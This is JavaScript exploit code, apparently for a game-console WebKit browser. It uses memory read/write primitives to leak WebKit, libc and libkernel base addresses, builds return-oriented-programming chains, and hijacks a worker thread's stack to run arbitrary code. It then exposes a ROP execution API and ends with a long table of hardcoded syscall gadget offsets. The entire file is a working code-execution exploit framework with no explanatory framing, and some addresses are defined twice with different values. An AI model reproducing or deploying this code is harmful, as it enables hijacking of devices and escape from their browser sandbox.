var ropchain_array = new Uint32Array(62);
var ropchain = read_ptr_at(addrof(ropchain_array)+0x10);
var ropchain_offset = 2;
function set_gadget(val)
{
    ropchain_array[ropchain_offset++] = val | 0;
    ropchain_array[ropchain_offset++] = (val / 4294967296) | 0;
}
function set_gadgets(l)
{
    for(var i = 0; i < l.length; i++)
        set_gadget(l[i]);
}
function db(data)
{
    for(var i = 0; i < data.length; i++)
        ropchain_array[ropchain_offset++] = data[i];
}
set_gadgets([
libc_base+289418, //pop rcx
ropchain+96, //rdi_stash
libc_base+106202, //mov [rcx], rdi
libc_base+276082 //pop rdi
]);
db([11, 0]); // 0xb
set_gadgets([
libc_base+77390, //pop rsi
ropchain+112, //sigaction
webkit_base+87786 //pop rdx
]);
db([0, 0]); // 0x0
set_gadgets([
sigaction_addr,
libc_base+276082 //pop rdi
]);
//rdi_stash:
db([0, 0]); // 0x0
set_gadgets([
pivot_addr,
//sigaction:
sigsegv_handler
]);
ropchain_offset += 32;
pivot(ropchain);

var malloc_nogc = [];
function malloc(sz)
{
    var arr = new Uint8Array(sz);
    malloc_nogc.push(arr);
    return read_ptr_at(addrof(arr)+0x10);
}
var tarea = document.createElement('textarea');
var vt_ptr = read_ptr_at(addrof(tarea)+0x18);
var vtable = read_ptr_at(vt_ptr);

var webkit_base = read_ptr_at(vtable) - 13649280;
var libkernel_base = read_ptr_at(webkit_base + 0x28f9d70) - 0x33580;
var libc_base = read_ptr_at(webkit_base + 0x28f9d38) - 0x148f0;

var thread_list = libkernel_base + 0x601a8;
var loadall_addr = libc_base + 0x435f8;
var saveall_addr = libc_base + 0x43674;
var pivot_addr = libc_base + 0x4366e;
var infloop_addr = webkit_base + 0x109e1;
var pthread_exit_addr = libkernel_base + 0x20a80;
var pthread_create_addr = libkernel_base + 0x2d450;
var get_errno_addr_addr = libkernel_base + 0x1d2a0;

function find_worker()
{
    for(var i = read_ptr_at(thread_list); i; i = read_ptr_at(i + 0x38))
        if(read_ptr_at(i + 0xb0) == 0x80000)
            return read_ptr_at(i + 0xa8);
    return 0;
}

var spin_table = malloc(88);

//set up rdi for returning
write_ptr_at(spin_table, webkit_base+0x788fd); //pop rdi
write_ptr_at(spin_table+8, spin_table-24); //32-56

//loop waiting for commands
write_ptr_at(spin_table+16, webkit_base+0x5d293); //pop rsp
write_ptr_at(spin_table+24, spin_table+16); //will overwrite with the jump target

//[rdi+56] is here on return
write_ptr_at(spin_table+32, spin_table+40);
write_ptr_at(spin_table+40, spin_table+24); //will be popped into rdi

//restore the loop
write_ptr_at(spin_table+48, webkit_base+0x84094); //pop rax
write_ptr_at(spin_table+56, spin_table+16);
write_ptr_at(spin_table+64, webkit_base+0x1254da); //mov [rdi], rax

//loop
write_ptr_at(spin_table+72, webkit_base+0x5d293); //pop rsp
write_ptr_at(spin_table+80, spin_table);

//hijack worker's control flow
var worker_stack = find_worker();
write_ptr_at(worker_stack+0x7fb88, webkit_base+0x5d293); //pop rsp
write_ptr_at(worker_stack+0x7fb90, spin_table);

the_worker.postMessage(1); //the worker is now busy in pop rsp loop

/* PUBLIC ROP API

This function is used to execute ROP chains. `buf` is an address of the start of the ROP chain.
* first 8 bytes of `buf` should be allocated but not used -- they are used internally.
* the actual ROP chain starts at `buf+8`
* jump to `pivot_addr` to return
*/
function pivot(buf)
{
    write_ptr_at(buf, spin_table-24);
    write_ptr_at(spin_table+24, buf+8);
    var q = 0;
    while((q = read_ptr_at(spin_table+24)) != spin_table+16);
}

/* NON-BLOCKING API

These functions are the same, except that they never block.
*/
function pivot_start(buf)
{
    //returns immediately
    write_ptr_at(buf, spin_table-24);
    write_ptr_at(spin_table+24, buf+8);
}

function pivot_has_finished()
{
    return read_ptr_at(spin_table+24) == spin_table+16;
}

function pivot_cb(buf, callback)
{
    pivot_start(buf);
    var wait = function()
    {
        if(pivot_has_finished())
            callback();
        else
            setTimeout(wait, 100);
    };
    wait();
}
var sys_613_addr = libkernel_base + 0x32ad0;
var sys_138_addr = libkernel_base + 0x32af0;
var sys_481_addr = libkernel_base + 0x32b10;
var sys_600_addr = libkernel_base + 0x32b30;
var sys_340_addr = libkernel_base + 0x32b50;
var sys_442_addr = libkernel_base + 0x32b70;
var sys_341_addr = libkernel_base + 0x32b90;
var sys_719_addr = libkernel_base + 0x32bb0;
var sys_686_addr = libkernel_base + 0x32bd0;
var sys_454_addr = libkernel_base + 0x32bf0;
var sys_118_addr = libkernel_base + 0x32c00;
var sys_7_addr = libkernel_base + 0x32c20;
var sys_100_addr = libkernel_base + 0x32c40;
var sys_183_addr = libkernel_base + 0x32c60;
var sys_86_addr = libkernel_base + 0x32c80;
var sys_627_addr = libkernel_base + 0x32ca0;
var sys_588_addr = libkernel_base + 0x32cc0;
var sys_551_addr = libkernel_base + 0x32ce0;
var sys_622_addr = libkernel_base + 0x32d00;
var sys_232_addr = libkernel_base + 0x32d20;
var sys_648_addr = libkernel_base + 0x32d40;
var sys_550_addr = libkernel_base + 0x32d60;
var sys_685_addr = libkernel_base + 0x32d80;
var sys_31_addr = libkernel_base + 0x32da0;
var sys_329_addr = libkernel_base + 0x32dc0;
var sys_652_addr = libkernel_base + 0x32de0;
var sys_722_addr = libkernel_base + 0x32e00;
var sys_165_addr = libkernel_base + 0x32e20;
var sys_564_addr = libkernel_base + 0x32e40;
var sys_83_addr = libkernel_base + 0x32e60;
var sys_79_addr = libkernel_base + 0x32e80;
var sys_430_addr = libkernel_base + 0x32ea0;
var sys_95_addr = libkernel_base + 0x32ec0;
var sys_499_addr = libkernel_base + 0x32ee0;
var sys_49_addr = libkernel_base + 0x32f00;
var sys_47_addr = libkernel_base + 0x32f20;
var sys_667_addr = libkernel_base + 0x32f40;
var sys_595_addr = libkernel_base + 0x32f60;
var sys_30_addr = libkernel_base + 0x32f80;
var sys_379_addr = libkernel_base + 0x32fa0;
var sys_682_addr = libkernel_base + 0x32fc0;
var sys_619_addr = libkernel_base + 0x32fe0;
var sys_363_addr = libkernel_base + 0x33000;
var sys_705_addr = libkernel_base + 0x33020;
var sys_332_addr = libkernel_base + 0x33040;
var sys_664_addr = libkernel_base + 0x33060;
var sys_23_addr = libkernel_base + 0x33080;
var sys_606_addr = libkernel_base + 0x330a0;
var sys_392_addr = libkernel_base + 0x330c0;
var sys_407_addr = libkernel_base + 0x330e0;
var sys_620_addr = libkernel_base + 0x33100;
var sys_400_addr = libkernel_base + 0x33120;
var sys_53_addr = libkernel_base + 0x33140;
var sys_333_addr = libkernel_base + 0x33160;
var sys_662_addr = libkernel_base + 0x33180;
var sys_604_addr = libkernel_base + 0x331a0;
var sys_687_addr = libkernel_base + 0x331c0;
var sys_658_addr = libkernel_base + 0x331e0;
var sys_431_addr = libkernel_base + 0x33200;
var sys_433_addr = libkernel_base + 0x33220;
var sys_106_addr = libkernel_base + 0x33240;
var sys_404_addr = libkernel_base + 0x33260;
var sys_641_addr = libkernel_base + 0x33280;
var sys_54_addr = libkernel_base + 0x332a0;
var sys_591_addr = libkernel_base + 0x332c0;
var sys_535_addr = libkernel_base + 0x332e0;
var sys_191_addr = libkernel_base + 0x33300;
var sys_679_addr = libkernel_base + 0x33320;
var sys_654_addr = libkernel_base + 0x33340;
var sys_4_addr = libkernel_base + 0x33360;
var sys_334_addr = libkernel_base + 0x33390;
var sys_611_addr = libkernel_base + 0x333b0;
var sys_42_addr = libkernel_base + 0x333d0;
var sys_3_addr = libkernel_base + 0x33400;
var sys_80_addr = libkernel_base + 0x33420;
var sys_242_addr = libkernel_base + 0x33440;
var sys_560_addr = libkernel_base + 0x33460;
var sys_39_addr = libkernel_base + 0x33480;
var sys_443_addr = libkernel_base + 0x334a0;
var sys_539_addr = libkernel_base + 0x334c0;
var sys_236_addr = libkernel_base + 0x334e0;
var sys_324_addr = libkernel_base + 0x33500;
var sys_480_addr = libkernel_base + 0x33520;
var sys_475_addr = libkernel_base + 0x33540;
var sys_397_addr = libkernel_base + 0x33560;
var sys_20_addr = libkernel_base + 0x33580;
var sys_653_addr = libkernel_base + 0x335a0;
var sys_592_addr = libkernel_base + 0x335c0;
var sys_137_addr = libkernel_base + 0x335e0;
var sys_327_addr = libkernel_base + 0x33600;
var sys_626_addr = libkernel_base + 0x33620;
var sys_97_addr = libkernel_base + 0x33640;
var sys_636_addr = libkernel_base + 0x33660;
var sys_206_addr = libkernel_base + 0x33680;
var sys_601_addr = libkernel_base + 0x336a0;
var sys_629_addr = libkernel_base + 0x336c0;
var sys_572_addr = libkernel_base + 0x336e0;
var sys_659_addr = libkernel_base + 0x33700;
var sys_195_addr = libkernel_base + 0x33720;
var sys_486_addr = libkernel_base + 0x33740;
var sys_638_addr = libkernel_base + 0x33760;
var sys_421_addr = libkernel_base + 0x33784;
var sys_546_addr = libkernel_base + 0x337b0;
var sys_429_addr = libkernel_base + 0x337d0;
var sys_75_addr = libkernel_base + 0x337f0;
var sys_251_addr = libkernel_base + 0x33819;
var sys_1_addr = libkernel_base + 0x3383a;
var sys_716_addr = libkernel_base + 0x33860;
var sys_124_addr = libkernel_base + 0x33880;
var sys_239_addr = libkernel_base + 0x338a0;
var sys_586_addr = libkernel_base + 0x338c0;
var sys_605_addr = libkernel_base + 0x338e0;
var sys_73_addr = libkernel_base + 0x33900;
var sys_634_addr = libkernel_base + 0x33920;
var sys_718_addr = libkernel_base + 0x33940;
var sys_633_addr = libkernel_base + 0x33960;
var sys_310_addr = libkernel_base + 0x33980;
var sys_558_addr = libkernel_base + 0x339a0;
var sys_78_addr = libkernel_base + 0x339c0;
var sys_37_addr = libkernel_base + 0x339e0;
var sys_5_addr = libkernel_base + 0x33a00;
var sys_635_addr = libkernel_base + 0x33a20;
var sys_25_addr = libkernel_base + 0x33a40;
var sys_93_addr = libkernel_base + 0x33a60;
var sys_657_addr = libkernel_base + 0x33a80;
var sys_331_addr = libkernel_base + 0x33aa0;
var sys_479_addr = libkernel_base + 0x33ac0;
var sys_27_addr = libkernel_base + 0x33ae0;
var sys_642_addr = libkernel_base + 0x33b00;
var sys_684_addr = libkernel_base + 0x33b20;
var sys_194_addr = libkernel_base + 0x33b40;
var sys_131_addr = libkernel_base + 0x33b60;
var sys_548_addr = libkernel_base + 0x33b80;
var sys_432_addr = libkernel_base + 0x33ba0;
var sys_688_addr = libkernel_base + 0x33bc0;
var sys_127_addr = libkernel_base + 0x33be0;
var sys_190_addr = libkernel_base + 0x33c00;
var sys_114_addr = libkernel_base + 0x33c20;
var sys_330_addr = libkernel_base + 0x33c40;
var sys_209_addr = libkernel_base + 0x33c60;
var sys_290_addr = libkernel_base + 0x33c80;
var sys_557_addr = libkernel_base + 0x33ca0;
var sys_59_addr = libkernel_base + 0x33ccd;
var sys_121_addr = libkernel_base + 0x33cf0;
var sys_28_addr = libkernel_base + 0x33d10;
var sys_602_addr = libkernel_base + 0x33d30;
var sys_678_addr = libkernel_base + 0x33d50;
var sys_598_addr = libkernel_base + 0x33d70;
var sys_549_addr = libkernel_base + 0x33d90;
var sys_466_addr = libkernel_base + 0x33db0;
var sys_563_addr = libkernel_base + 0x33dd0;
var sys_96_addr = libkernel_base + 0x33df0;
var sys_533_addr = libkernel_base + 0x33e10;
var sys_615_addr = libkernel_base + 0x33e30;
var sys_565_addr = libkernel_base + 0x33e50;
var sys_566_addr = libkernel_base + 0x33e70;
var sys_120_addr = libkernel_base + 0x33e90;
var sys_401_addr = libkernel_base + 0x33eb0;
var sys_630_addr = libkernel_base + 0x33ed0;
var sys_556_addr = libkernel_base + 0x33ef0;
var sys_92_addr = libkernel_base + 0x33f10;
var sys_675_addr = libkernel_base + 0x33f30;
var sys_105_addr = libkernel_base + 0x33f50;
var sys_594_addr = libkernel_base + 0x33f70;
var sys_666_addr = libkernel_base + 0x33f90;
var sys_663_addr = libkernel_base + 0x33fb0;
var sys_522_addr = libkernel_base + 0x33fd0;
var sys_541_addr = libkernel_base + 0x33ff0;
var sys_694_addr = libkernel_base + 0x34010;
var sys_6_addr = libkernel_base + 0x34030;
var sys_680_addr = libkernel_base + 0x34050;
var sys_538_addr = libkernel_base + 0x34070;
var sys_532_addr = libkernel_base + 0x34090;
var sys_15_addr = libkernel_base + 0x340b0;
var sys_141_addr = libkernel_base + 0x340d0;
var sys_125_addr = libkernel_base + 0x340f0;
var sys_65_addr = libkernel_base + 0x34110;
var sys_536_addr = libkernel_base + 0x34130;
var sys_623_addr = libkernel_base + 0x34150;
var sys_587_addr = libkernel_base + 0x34170;
var sys_233_addr = libkernel_base + 0x34190;
var sys_693_addr = libkernel_base + 0x341b0;
var sys_203_addr = libkernel_base + 0x341d0;
var sys_618_addr = libkernel_base + 0x341f0;
var sys_607_addr = libkernel_base + 0x34210;
var sys_1_addr = libkernel_base + 0x34230;
var sys_113_addr = libkernel_base + 0x34250;
var sys_328_addr = libkernel_base + 0x34270;
var sys_547_addr = libkernel_base + 0x34290;
var sys_542_addr = libkernel_base + 0x342b0;
var sys_243_addr = libkernel_base + 0x342d0;
var sys_677_addr = libkernel_base + 0x342f0;
var sys_628_addr = libkernel_base + 0x34310;
var sys_147_addr = libkernel_base + 0x34330;
var sys_717_addr = libkernel_base + 0x34350;
var sys_553_addr = libkernel_base + 0x34370;
var sys_136_addr = libkernel_base + 0x34390;
var sys_637_addr = libkernel_base + 0x343b0;
var sys_647_addr = libkernel_base + 0x343d0;
var sys_534_addr = libkernel_base + 0x343f0;
var sys_540_addr = libkernel_base + 0x34410;
var sys_544_addr = libkernel_base + 0x34430;
var sys_241_addr = libkernel_base + 0x34450;
var sys_56_addr = libkernel_base + 0x34470;
var sys_691_addr = libkernel_base + 0x34490;
var sys_422_addr = libkernel_base + 0x344b0;
var sys_89_addr = libkernel_base + 0x344d0;
var sys_617_addr = libkernel_base + 0x344f0;
var sys_444_addr = libkernel_base + 0x34510;
var sys_35_addr = libkernel_base + 0x34530;
var sys_690_addr = libkernel_base + 0x34550;
var sys_55_addr = libkernel_base + 0x34570;
var sys_515_addr = libkernel_base + 0x34590;
var sys_192_addr = libkernel_base + 0x345b0;
var sys_423_addr = libkernel_base + 0x345d0;
var sys_135_addr = libkernel_base + 0x345f0;
var sys_555_addr = libkernel_base + 0x34610;
var sys_668_addr = libkernel_base + 0x34630;
var sys_476_addr = libkernel_base + 0x34650;
var sys_74_addr = libkernel_base + 0x34670;
var sys_24_addr = libkernel_base + 0x34690;
var sys_12_addr = libkernel_base + 0x346b0;
var sys_98_addr = libkernel_base + 0x346d0;
var sys_238_addr = libkernel_base + 0x346f0;
var sys_640_addr = libkernel_base + 0x34710;
var sys_289_addr = libkernel_base + 0x34730;
var sys_402_addr = libkernel_base + 0x34750;
var sys_59_addr = libkernel_base + 0x34770;
var sys_50_addr = libkernel_base + 0x34790;
var sys_346_addr = libkernel_base + 0x347c0;
var sys_676_addr = libkernel_base + 0x347e0;
var sys_464_addr = libkernel_base + 0x34800;
var sys_681_addr = libkernel_base + 0x34820;
var sys_441_addr = libkernel_base + 0x34840;
var sys_29_addr = libkernel_base + 0x34860;
var sys_253_addr = libkernel_base + 0x34880;
var sys_643_addr = libkernel_base + 0x348a0;
var sys_567_addr = libkernel_base + 0x348c0;
var sys_90_addr = libkernel_base + 0x348e0;
var sys_325_addr = libkernel_base + 0x34900;
var sys_408_addr = libkernel_base + 0x34920;
var sys_122_addr = libkernel_base + 0x34940;
var sys_406_addr = libkernel_base + 0x34960;
var sys_554_addr = libkernel_base + 0x34980;
var sys_545_addr = libkernel_base + 0x349a0;
var sys_656_addr = libkernel_base + 0x349c0;
var sys_33_addr = libkernel_base + 0x349e0;
var sys_671_addr = libkernel_base + 0x34a00;
var sys_478_addr = libkernel_base + 0x34a20;
var sys_41_addr = libkernel_base + 0x34a40;
var sys_343_addr = libkernel_base + 0x34a60;
var sys_543_addr = libkernel_base + 0x34a80;
var sys_417_addr = libkernel_base + 0x34aa0;
var sys_488_addr = libkernel_base + 0x34ac0;
var sys_625_addr = libkernel_base + 0x34ae0;
var sys_665_addr = libkernel_base + 0x34b00;
var sys_202_addr = libkernel_base + 0x34b20;
var sys_128_addr = libkernel_base + 0x34b40;
var sys_34_addr = libkernel_base + 0x34b60;
var sys_345_addr = libkernel_base + 0x34b80;
var sys_603_addr = libkernel_base + 0x34ba0;
var sys_204_addr = libkernel_base + 0x34bc0;
var sys_720_addr = libkernel_base + 0x34be0;
var sys_661_addr = libkernel_base + 0x34c00;
var sys_240_addr = libkernel_base + 0x34c20;
var sys_692_addr = libkernel_base + 0x34c40;
var sys_101_addr = libkernel_base + 0x34c60;
var sys_405_addr = libkernel_base + 0x34c80;
var sys_721_addr = libkernel_base + 0x34ca0;
var sys_247_addr = libkernel_base + 0x34cc0;
var sys_104_addr = libkernel_base + 0x34ce0;
var sys_585_addr = libkernel_base + 0x34d00;
var sys_10_addr = libkernel_base + 0x34d20;
var sys_196_addr = libkernel_base + 0x34d40;
var sys_235_addr = libkernel_base + 0x34d60;
var sys_655_addr = libkernel_base + 0x34d80;
var sys_362_addr = libkernel_base + 0x34da0;
var sys_182_addr = libkernel_base + 0x34dc0;
var sys_596_addr = libkernel_base + 0x34de0;
var sys_416_addr = libkernel_base + 0x34e00;
var sys_188_addr = libkernel_base + 0x34e20;
var sys_315_addr = libkernel_base + 0x34e40;
var sys_672_addr = libkernel_base + 0x34e60;
var sys_674_addr = libkernel_base + 0x34e80;
var sys_456_addr = libkernel_base + 0x34ea0;
var sys_32_addr = libkernel_base + 0x34ec0;
var sys_616_addr = libkernel_base + 0x34ee0;
var sys_483_addr = libkernel_base + 0x34f00;
var sys_477_addr = libkernel_base + 0x34f20;
var sys_455_addr = libkernel_base + 0x34f40;
var sys_649_addr = libkernel_base + 0x34f60;
var sys_140_addr = libkernel_base + 0x34f80;
var sys_670_addr = libkernel_base + 0x34fa0;
var sys_126_addr = libkernel_base + 0x34fc0;
var sys_102_addr = libkernel_base + 0x34fe0;
var sys_673_addr = libkernel_base + 0x35000;
var sys_272_addr = libkernel_base + 0x35020;
var sys_99_addr = libkernel_base + 0x35040;
var sys_593_addr = libkernel_base + 0x35060;
var sys_43_addr = libkernel_base + 0x35080;
var sys_669_addr = libkernel_base + 0x350a0;
var sys_599_addr = libkernel_base + 0x350c0;
var sys_234_addr = libkernel_base + 0x35190;
var sys_646_addr = libkernel_base + 0x351c0;
var sys_2_addr = libkernel_base + 0x351e0;
var sys_454_addr = libkernel_base + 0x35200;
var sys_189_addr = libkernel_base + 0x35220;
var sys_237_addr = libkernel_base + 0x35240;
var sys_134_addr = libkernel_base + 0x35260;
var sys_713_addr = libkernel_base + 0x35280;
var sys_689_addr = libkernel_base + 0x352a0;
var sys_612_addr = libkernel_base + 0x352c0;
var sys_552_addr = libkernel_base + 0x352e0;
var sys_487_addr = libkernel_base + 0x35300;
var sys_683_addr = libkernel_base + 0x35320;
var sys_340_addr = libkernel_base + 0x35343;
var sys_44_addr = libkernel_base + 0x353d0;
var sys_116_addr = libkernel_base + 0x353f0;
var sys_36_addr = libkernel_base + 0x35410;
var sys_133_addr = libkernel_base + 0x35430;
var sys_660_addr = libkernel_base + 0x35450;
var sys_632_addr = libkernel_base + 0x35470;
var sys_482_addr = libkernel_base + 0x35490;
var sys_608_addr = libkernel_base + 0x354b0;
var sys_117_addr = libkernel_base + 0x354d0;
var sys_403_addr = libkernel_base + 0x354f0;
var sys_393_addr = libkernel_base + 0x35510;
var sys_624_addr = libkernel_base + 0x35530;
var sys_610_addr = libkernel_base + 0x35550;
var sys_559_addr = libkernel_base + 0x35570;
var sys_639_addr = libkernel_base + 0x35590;
var get_resident_count_addr = sys_613_addr;
var utimes_addr = sys_138_addr;
var thr_kill2_addr = sys_481_addr;
var sandbox_path_addr = sys_600_addr;
var sigprocmask_addr = sys_340_addr;
var thr_suspend_addr = sys_442_addr;
var sigsuspend_addr = sys_341_addr;
var _umtx_op_addr = sys_454_addr;
var getsockopt_addr = sys_118_addr;
var wait4_addr = sys_7_addr;
var getpriority_addr = sys_100_addr;
var seteuid_addr = sys_183_addr;
var getitimer_addr = sys_86_addr;
var get_cpu_usage_all_addr = sys_627_addr;
var mname_addr = sys_588_addr;
var osem_open_addr = sys_551_addr;
var ipmimgr_call_addr = sys_622_addr;
var clock_gettime_addr = sys_232_addr;
var app_state_change_addr = sys_648_addr;
var osem_delete_addr = sys_550_addr;
var getpeername_addr = sys_31_addr;
var sched_setscheduler_addr = sys_329_addr;
var process_terminate_addr = sys_652_addr;
var sysarch_addr = sys_165_addr;
var opmc_disable_addr = sys_564_addr;
var setitimer_addr = sys_83_addr;
var getgroups_addr = sys_79_addr;
var thr_create_addr = sys_430_addr;
var fsync_addr = sys_95_addr;
var openat_addr = sys_499_addr;
var getlogin_addr = sys_49_addr;
var getgid_addr = sys_47_addr;
var get_bio_usage_all_addr = sys_667_addr;
var dynlib_unload_prx_addr = sys_595_addr;
var accept_addr = sys_30_addr;
var mtypeprotect_addr = sys_379_addr;
var test_debug_rwmem_addr = sys_619_addr;
var kevent_addr = sys_363_addr;
var sched_get_priority_max_addr = sys_332_addr;
var aio_multi_poll_addr = sys_664_addr;
var setuid_addr = sys_23_addr;
var is_development_mode_addr = sys_606_addr;
var uuidgen_addr = sys_392_addr;
var ksem_getvalue_addr = sys_407_addr;
var free_stack_addr = sys_620_addr;
var ksem_close_addr = sys_400_addr;
var sigaltstack_addr = sys_53_addr;
var sched_get_priority_min_addr = sys_333_addr;
var aio_multi_delete_addr = sys_662_addr;
var dl_get_metadata_addr = sys_604_addr;
var fdatasync_addr = sys_658_addr;
var thr_exit_addr = sys_431_addr;
var thr_kill_addr = sys_433_addr;
var listen_addr = sys_106_addr;
var ksem_init_addr = sys_404_addr;
var get_cpu_usage_proc_addr = sys_641_addr;
var ioctl_addr = sys_54_addr;
var dynlib_dlsym_addr = sys_591_addr;
var dl_get_list_addr = sys_535_addr;
var pathconf_addr = sys_191_addr;
var blockpool_map_addr = sys_654_addr;
var write_addr = sys_4_addr;
var sched_rr_get_interval_addr = sys_334_addr;
var get_paging_stats_of_all_threads_addr = sys_611_addr;
var pipe_addr = sys_42_addr;
var read_addr = sys_3_addr;
var setgroups_addr = sys_80_addr;
var nosys_addr = sys_242_addr;
var debug_init_addr = sys_560_addr;
var getppid_addr = sys_39_addr;
var thr_wake_addr = sys_443_addr;
var evf_delete_addr = sys_539_addr;
var ktimer_delete_addr = sys_236_addr;
var mlockall_addr = sys_324_addr;
var ftruncate_addr = sys_480_addr;
var pread_addr = sys_475_addr;
var fstatfs_addr = sys_397_addr;
var getpid_addr = sys_20_addr;
var blockpool_open_addr = sys_653_addr;
var dynlib_get_list_addr = sys_592_addr;
var rmdir_addr = sys_137_addr;
var sched_setparam_addr = sys_327_addr;
var opmc_get_hw_addr = sys_626_addr;
var socket_addr = sys_97_addr;
var set_timezone_info_addr = sys_636_addr;
var futimes_addr = sys_206_addr;
var mdbg_service_addr = sys_601_addr;
var physhm_open_addr = sys_629_addr;
var virtual_query_addr = sys_572_addr;
var dynlib_get_list2_addr = sys_659_addr;
var setrlimit_addr = sys_195_addr;
var cpuset_getid_addr = sys_486_addr;
var utc_to_localtime_addr = sys_638_addr;
var getcontext_addr = sys_421_addr;
var evf_cancel_addr = sys_546_addr;
var sigwait_addr = sys_429_addr;
var madvise_addr = sys_75_addr;
var rfork_addr = sys_251_addr;
var sys_exit_addr = sys_1_addr;
var fchmod_addr = sys_124_addr;
var ktimer_getoverrun_addr = sys_239_addr;
var dmem_container_addr = sys_586_addr;
var workaround8849_addr = sys_605_addr;
var munmap_addr = sys_73_addr;
var thr_get_ucontext_addr = sys_634_addr;
var thr_resume_ucontext_addr = sys_633_addr;
var getsid_addr = sys_310_addr;
var namedobj_delete_addr = sys_558_addr;
var mincore_addr = sys_78_addr;
var kill_addr = sys_37_addr;
var open_addr = sys_5_addr;
var thr_set_ucontext_addr = sys_635_addr;
var geteuid_addr = sys_25_addr;
var select_addr = sys_93_addr;
var blockpool_batch_addr = sys_657_addr;
var sched_yield_addr = sys_331_addr;
var truncate_addr = sys_479_addr;
var recvmsg_addr = sys_27_addr;
var get_map_statistics_addr = sys_642_addr;
var getrlimit_addr = sys_194_addr;
var flock_addr = sys_131_addr;
var batch_map_addr = sys_548_addr;
var thr_self_addr = sys_432_addr;
var setregid_addr = sys_127_addr;
var lstat_addr = sys_190_addr;
var socketclose_addr = sys_114_addr;
var sched_getscheduler_addr = sys_330_addr;
var poll_addr = sys_209_addr;
var pwritev_addr = sys_290_addr;
var namedobj_create_addr = sys_557_addr;
var execve_addr = sys_59_addr;
var writev_addr = sys_121_addr;
var sendmsg_addr = sys_28_addr;
var randomized_path_addr = sys_602_addr;
var dynlib_get_proc_param_addr = sys_598_addr;
var osem_create_addr = sys_549_addr;
var rtprio_thread_addr = sys_466_addr;
var opmc_enable_addr = sys_563_addr;
var setpriority_addr = sys_96_addr;
var jitshm_create_addr = sys_533_addr;
var get_resident_fmem_count_addr = sys_615_addr;
var opmc_set_ctl_addr = sys_565_addr;
var opmc_set_ctr_addr = sys_566_addr;
var readv_addr = sys_120_addr;
var ksem_post_addr = sys_401_addr;
var physhm_unlink_addr = sys_630_addr;
var osem_cancel_addr = sys_556_addr;
var fcntl_addr = sys_92_addr;
var reserve_2mb_page_addr = sys_675_addr;
var setsockopt_addr = sys_105_addr;
var dynlib_load_prx_addr = sys_594_addr;
var aio_multi_cancel_addr = sys_666_addr;
var aio_multi_wait_addr = sys_663_addr;
var pselect_addr = sys_522_addr;
var evf_close_addr = sys_541_addr;
var close_addr = sys_6_addr;
var evf_create_addr = sys_538_addr;
var regmgr_call_addr = sys_532_addr;
var chmod_addr = sys_15_addr;
var kqueueex_addr = sys_141_addr;
var netgetiflist_addr = sys_125_addr;
var msync_addr = sys_65_addr;
var dl_get_info_addr = sys_536_addr;
var get_gpo_addr = sys_623_addr;
var get_authinfo_addr = sys_587_addr;
var clock_settime_addr = sys_233_addr;
var mlock_addr = sys_203_addr;
var get_paging_stats_of_all_objects_addr = sys_618_addr;
var get_self_auth_info_addr = sys_607_addr;
var sys_exit_addr = sys_1_addr;
var socketex_addr = sys_113_addr;
var sched_getparam_addr = sys_328_addr;
var query_memory_protection_addr = sys_547_addr;
var evf_wait_addr = sys_542_addr;
var nosys_addr = sys_243_addr;
var get_phys_page_size_addr = sys_677_addr;
var mmap_dmem_addr = sys_628_addr;
var setsid_addr = sys_147_addr;
var osem_wait_addr = sys_553_addr;
var mkdir_addr = sys_136_addr;
var set_phys_fmem_limit_addr = sys_637_addr;
var get_sdk_compiled_version_addr = sys_647_addr;
var jitshm_alias_addr = sys_534_addr;
var evf_open_addr = sys_540_addr;
var evf_set_addr = sys_544_addr;
var nosys_addr = sys_241_addr;
var revoke_addr = sys_56_addr;
var setcontext_addr = sys_422_addr;
var getdtablesize_addr = sys_89_addr;
var set_gpo_addr = sys_617_addr;
var kldunloadf_addr = sys_444_addr;
var fchflags_addr = sys_35_addr;
var reboot_addr = sys_55_addr;
var cap_getrights_addr = sys_515_addr;
var fpathconf_addr = sys_192_addr;
var swapcontext_addr = sys_423_addr;
var socketpair_addr = sys_135_addr;
var osem_post_addr = sys_555_addr;
var aio_create_addr = sys_668_addr;
var pwrite_addr = sys_476_addr;
var mprotect_addr = sys_74_addr;
var getuid_addr = sys_24_addr;
var chdir_addr = sys_12_addr;
var connect_addr = sys_98_addr;
var ktimer_gettime_addr = sys_238_addr;
var set_uevt_addr = sys_640_addr;
var preadv_addr = sys_289_addr;
var ksem_wait_addr = sys_402_addr;
var execve_addr = sys_59_addr;
var setlogin_addr = sys_50_addr;
var sigwaitinfo_addr = sys_346_addr;
var cpumode_yield_addr = sys_676_addr;
var thr_set_name_addr = sys_464_addr;
var ksem_timedwait_addr = sys_441_addr;
var recvfrom_addr = sys_29_addr;
var issetugid_addr = sys_253_addr;
var set_chicken_switches_addr = sys_643_addr;
var opmc_get_ctr_addr = sys_567_addr;
var dup2_addr = sys_90_addr;
var munlockall_addr = sys_325_addr;
var ksem_destroy_addr = sys_408_addr;
var settimeofday_addr = sys_122_addr;
var ksem_unlink_addr = sys_406_addr;
var osem_trywait_addr = sys_554_addr;
var evf_clear_addr = sys_545_addr;
var dynlib_get_info_for_libdbg_addr = sys_656_addr;
var access_addr = sys_33_addr;
var get_page_table_stats_addr = sys_671_addr;
var lseek_addr = sys_478_addr;
var dup_addr = sys_41_addr;
var sigpending_addr = sys_343_addr;
var evf_trywait_addr = sys_543_addr;
var sigreturn_addr = sys_417_addr;
var cpuset_setaffinity_addr = sys_488_addr;
var opmc_set_hw_addr = sys_625_addr;
var aio_get_data_addr = sys_665_addr;
var __sysctl_addr = sys_202_addr;
var rename_addr = sys_128_addr;
var chflags_addr = sys_34_addr;
var sigtimedwait_addr = sys_345_addr;
var rdup_addr = sys_603_addr;
var munlock_addr = sys_204_addr;
var aio_submit_addr = sys_661_addr;
var nanosleep_addr = sys_240_addr;
var netabort_addr = sys_101_addr;
var ksem_open_addr = sys_405_addr;
var clock_getcpuclockid2_addr = sys_247_addr;
var bind_addr = sys_104_addr;
var is_in_sandbox_addr = sys_585_addr;
var unlink_addr = sys_10_addr;
var getdirentries_addr = sys_196_addr;
var ktimer_create_addr = sys_235_addr;
var blockpool_unmap_addr = sys_655_addr;
var kqueue_addr = sys_362_addr;
var setegid_addr = sys_182_addr;
var dynlib_do_copy_relocations_addr = sys_596_addr;
var sigaction_addr = sys_416_addr;
var stat_addr = sys_188_addr;
var aio_suspend_addr = sys_315_addr;
var dynlib_get_list_for_libdbg_addr = sys_672_addr;
var virtual_query_all_addr = sys_674_addr;
var sigqueue_addr = sys_456_addr;
var getsockname_addr = sys_32_addr;
var thr_get_name_addr = sys_616_addr;
var shm_unlink_addr = sys_483_addr;
var mmap_addr = sys_477_addr;
